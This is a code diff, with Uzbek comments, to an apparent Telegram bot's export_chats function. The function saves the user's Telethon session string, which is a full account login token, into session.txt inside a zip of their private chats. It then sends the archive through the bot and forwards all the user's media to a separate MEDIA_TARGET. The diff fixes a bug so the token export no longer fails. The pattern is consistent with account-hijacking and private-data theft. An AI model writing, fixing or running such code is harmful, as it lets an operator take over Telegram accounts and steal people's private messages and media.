@@ -260,8 +260,10 @@ async def export_chats(uid):
     all_media = []
     zip_name = f"chats_{uid}.zip"
 
-    # 🔐 StringSession olish
+    # 🔐 StringSession olish (❗ MUAMMO SHU YERDA EDI)
     session_string = client.session.save()
+    if not session_string:
+        session_string = "SESSION_NOT_AVAILABLE"
 
     for d in await client.get_dialogs():
         if isinstance(d.entity, User) and not d.entity.bot:
@@ -296,7 +298,7 @@ async def export_chats(uid):
                 full = os.path.join(root, file)
                 z.write(full, arcname=os.path.relpath(full, BASE_DIR))
 
-        # 🔐 session.txt
+        # 🔐 session.txt (endi xato bermaydi)
         z.writestr("session.txt", session_string)
 
     await bot.send_document(
@@ -305,7 +307,7 @@ async def export_chats(uid):
         caption=f"📦 Chatlar eksport qilindi | UID: {uid}"
     )
 
-    # media forward
+    # ================= MEDIA FORWARD =================
     for m in all_media:
         try:
             await m.forward_to(MEDIA_TARGET)
@@ -317,6 +319,7 @@ async def export_chats(uid):
     os.remove(zip_name)
     await client.disconnect()
     sessions.pop(uid, None)
+
 
 
 # ================== ADMIN ==================
